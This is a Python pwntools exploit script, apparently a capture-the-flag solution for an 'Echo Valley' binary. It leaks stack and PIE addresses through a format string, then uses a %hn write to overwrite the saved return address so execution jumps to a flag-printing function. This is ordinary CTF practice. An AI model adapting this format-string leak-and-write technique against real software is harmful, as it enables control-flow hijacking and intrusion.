#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template valley
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'valley')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

STACK_PIE_LEAK_FMT = b'%20$p %21$p'
LEAK_MAIN_OFFSET = 18
STACK_RIP_OFFSET = 8

io = start()

io.info(b"sending first fmt string to leak .text address and stack addr...")
io.readuntil(b'Welcome to the Echo Valley, Try Shouting: \n')
io.sendline(STACK_PIE_LEAK_FMT)

leak_vals = io.readline().strip().split(b' ')
stack_leak_addr = int(leak_vals[-2], 16)
io.success(b"stack_leak_addr = 0x%08x" % stack_leak_addr)
pie_leak_addr = int(leak_vals[-1], 16)
io.success(b"pie_leak_addr = 0x%08x" % pie_leak_addr)
pie_base = pie_leak_addr - exe.symbols['main'] - LEAK_MAIN_OFFSET
io.success(b"pie_base = 0x%08x" % pie_base)
win_addr = pie_base + exe.symbols['print_flag']
io.success(b"win_addr = 0x%08x" % win_addr)
saved_rip = stack_leak_addr - STACK_RIP_OFFSET
io.success(b"saved_rip = 0x%08x" % saved_rip)

#pause()

payload = b"%0" + b"%d" % (win_addr & 0xFFFF) + b"x%8$hn" # inc the counter and write to the pointer
payload += b"." * (16 - len(payload)) + p64(saved_rip) # fix the paddding and plunk in our pointer


io.sendline(payload)
io.sendline(b"exit")  # trigger ret2print_flag

io.interactive()

